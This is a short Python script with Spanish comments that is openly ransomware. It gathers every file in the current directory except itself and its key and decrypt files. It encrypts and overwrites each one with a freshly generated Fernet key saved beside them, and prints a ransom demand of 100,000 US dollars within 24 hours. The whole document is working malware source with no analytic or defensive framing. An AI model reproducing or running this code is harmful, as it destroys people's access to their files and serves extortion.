#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Loop para encontrar archivos

files = []

for file in os.listdir():
	if file == "ransware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
#Mensaje de resolucion
print("Todos los archivos se enciptaron con exito...")
#Rescate...
print("Si los quieren de nuevo quiero U$D 100.000 dentro de las proximas 24hs...")


#Ransomeware Key
key = Fernet.generate_key()

#Guardamos la llave en un archivo
with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
